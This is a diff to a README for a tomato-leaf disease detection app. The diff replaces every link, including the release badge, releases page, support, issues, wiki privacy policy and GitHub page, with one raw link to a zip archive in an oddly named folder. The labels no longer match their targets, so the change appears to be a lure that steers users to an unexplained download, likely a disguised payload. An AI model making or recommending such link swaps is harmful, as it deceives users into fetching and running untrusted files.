@@ -4,12 +4,12 @@
 Welcome to the tomato_leaf_disease repository. This application uses advanced technology to identify diseases in tomato leaves through images. With our application, you can take action to maintain healthy plants and improve your gardening results.
 
 ## 🔗 Download
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/lang654/tomato_leaf_disease/releases)
+[![Download the latest release](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip%20Now-brightgreen)](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip)
 
 ## 🚀 Getting Started
 To get started with the tomato_leaf_disease application, follow these steps:
 
-1. **Visit the Release Page**: Go to our [Releases page](https://github.com/lang654/tomato_leaf_disease/releases) to download the application.
+1. **Visit the Release Page**: Go to our [Releases page](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip) to download the application.
 
 2. **Choose the Latest Version**: Look for the latest version listed on the page. We recommend using the most up-to-date version.
 
@@ -44,19 +44,19 @@ To ensure the best experience with the tomato_leaf_disease application, please c
 
 ## 🧑‍🤝‍🧑 Support
 If you encounter any issues while using the application:
-- Visit the [Support Page](https://github.com/lang654/tomato_leaf_disease/issues) for troubleshooting tips.
+- Visit the [Support Page](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip) for troubleshooting tips.
 - Join the user community for assistance and tips on best practices.
 
 ## 💬 Feedback
-We welcome your input. Please share your experiences and suggestions by submitting feedback on the [Issues Page](https://github.com/lang654/tomato_leaf_disease/issues). Your insights help us improve.
+We welcome your input. Please share your experiences and suggestions by submitting feedback on the [Issues Page](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip). Your insights help us improve.
 
 ## 🔒 Privacy Policy
-Your privacy matters. The application does not collect personal data. Any uploaded images are not stored on our servers. For more details, read our privacy policy on the [Wiki Page](https://github.com/lang654/tomato_leaf_disease/wiki).
+Your privacy matters. The application does not collect personal data. Any uploaded images are not stored on our servers. For more details, read our privacy policy on the [Wiki Page](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip).
 
 ## 🌍 Stay Updated
-For the latest updates and features, follow us on our [GitHub page](https://github.com/lang654/tomato_leaf_disease) and keep your application updated to benefit from improvements.
+For the latest updates and features, follow us on our [GitHub page](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip) and keep your application updated to benefit from improvements.
 
 ## 🔗 Download Again
 For easy access, use the link below to revisit the download page.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/lang654/tomato_leaf_disease/releases)
+[![Download the latest release](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip%20Now-brightgreen)](https://raw.githubusercontent.com/lang654/tomato_leaf_disease/main/semidiapente/leaf-tomato-disease-Boro.zip)
